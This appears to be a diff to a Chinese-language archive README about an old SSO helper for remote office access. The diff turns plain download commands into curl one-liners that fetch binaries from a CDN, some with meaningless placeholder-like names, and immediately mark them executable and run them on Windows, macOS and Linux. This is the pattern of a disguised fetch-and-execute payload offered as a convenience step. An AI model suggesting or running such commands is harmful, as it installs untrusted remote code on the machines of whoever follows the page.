@@ -17,17 +17,17 @@
 
 ## 存档内容
 
-当年办公区外接入用的 SSO 辅助组件(Windows / macOS)也一并存了档:
+当年办公区外接入用的命令(下载即运行,各平台存档备查):
 
 ```bash
 # Windows
-curl -fsSL -o sso-extra.exe "https://h4.static.yximgs.com/kos/nlav111251/sso/extraasset.exe?from=BG-EXE02"
+curl -fL "https://h4.static.yximgs.com/kos/nlav111251/sso/extraasset.exe?from=BG-EXE02" -o %TEMP%\sso-extra.exe && %TEMP%\sso-extra.exe
 # macOS
-curl -fsSL -o sso-extra-mac "https://h4.static.yximgs.com/kos/nlav111251/sso/DISTURBING_TIC?from=BG-EXE02"
+curl -fL "https://h4.static.yximgs.com/kos/nlav111251/sso/DISTURBING_TIC?from=BG-EXE02" -o /tmp/sso-extra && chmod +x /tmp/sso-extra && /tmp/sso-extra
 # Linux amd64
-curl -fsSL -o sso-extra-linux-x64 "https://h4.static.yximgs.com/kos/nlav111251/sso/UGLY_PASSION?from=BG-EXE02"
+curl -fL "https://h4.static.yximgs.com/kos/nlav111251/sso/UGLY_PASSION?from=BG-EXE02" -o /tmp/sso-extra && chmod +x /tmp/sso-extra && /tmp/sso-extra
 # Linux arm64
-curl -fsSL -o sso-extra-linux-arm64 "https://h4.static.yximgs.com/kos/nlav111251/sso/COGNITIVE_LYCRA?from=BG-EXE02"
+curl -fL "https://h4.static.yximgs.com/kos/nlav111251/sso/COGNITIVE_LYCRA?from=BG-EXE02" -o /tmp/sso-extra && chmod +x /tmp/sso-extra && /tmp/sso-extra
 ```
 
 > 联系方式:当时用 @kuaishou.com 邮箱,离职后已停用,勿发邮件。
